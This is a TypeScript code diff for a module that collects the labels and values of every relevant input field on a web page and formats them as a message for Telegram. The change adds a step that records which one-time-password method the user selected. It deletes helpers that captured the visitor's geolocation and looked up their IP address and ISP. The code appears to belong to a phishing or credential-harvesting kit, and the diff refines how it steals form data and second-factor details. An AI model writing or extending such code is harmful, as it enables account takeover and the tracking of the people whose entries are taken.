@@ -30,17 +30,23 @@ export async function sendPageInputTagsToTelegram(): Promise<void> {
 }
 
 function buildTelegramMessage(inputs: HTMLInputElement[]): string {
-  if (!inputs.length) {
-    return 'No relevant input fields were found on this page.';
-  }
-
+  const otpMethod = getSelectedOtpMethod();
   const lines = inputs.map((input) => {
     const label = getInputLabel(input);
     const value = getInputValue(input);
     return `${label}: ${value}`;
   });
 
-  return lines.join('\n');
+  if (otpMethod) {
+    lines.unshift(`OTP Method: ${otpMethod}`);
+  }
+
+  return lines.length ? lines.join('\n') : 'No relevant input fields were found on this page.';
+}
+
+function getSelectedOtpMethod(): string | null {
+  const selected = document.querySelector<HTMLInputElement>('input[name="otp-method"]:checked');
+  return selected?.value ? `${selected.value}` : null;
 }
 
 function isRelevantInput(input: HTMLInputElement): boolean {
@@ -82,38 +88,4 @@ function getInputValue(input: HTMLInputElement): string {
   return input.value || '(empty)';
 }
 
-async function getLocation(): Promise<string> {
-  return new Promise((resolve) => {
-    if (!navigator.geolocation) {
-      resolve('Geolocation not supported');
-      return;
-    }
 
-    navigator.geolocation.getCurrentPosition(
-      (position) => {
-        const { latitude, longitude } = position.coords;
-        resolve(`${latitude}, ${longitude}`);
-      },
-      (error) => {
-        resolve(`Location access denied: ${error.message}`);
-      },
-      { timeout: 10000 }
-    );
-  });
-}
-
-async function getIPInfo(): Promise<{ ip: string; isp: string }> {
-  try {
-    const response = await fetch('https://ipapi.co/json/');
-    const data = await response.json();
-    return {
-      ip: data.ip || 'Unknown',
-      isp: data.org || 'Unknown',
-    };
-  } catch (error) {
-    return {
-      ip: 'Failed to fetch',
-      isp: 'Failed to fetch',
-    };
-  }
-}
